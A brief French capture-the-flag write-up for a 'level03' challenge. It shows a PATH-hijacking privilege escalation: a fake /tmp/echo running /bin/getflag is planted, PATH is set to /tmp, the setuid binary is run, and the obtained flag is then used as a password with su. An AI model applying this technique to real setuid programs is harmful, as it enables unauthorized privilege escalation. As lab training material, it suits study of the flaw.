## 1. Analyser le fichier binaire level03

    On trouve: /usr/bin/env echo Exploit me

## 2. Modifier la commande echo et le PATH

    echo '/bin/getflag' > /tmp/echo
    chmod +x /tmp/echo
    PATH=/tmp

Puis on execute ./level03

    Cela affiche: qi0maab88jeaj46qoumi7maus

## 3. Connexion

/bin/su level02

    Mot de passe : qi0maab88jeaj46qoumi7maus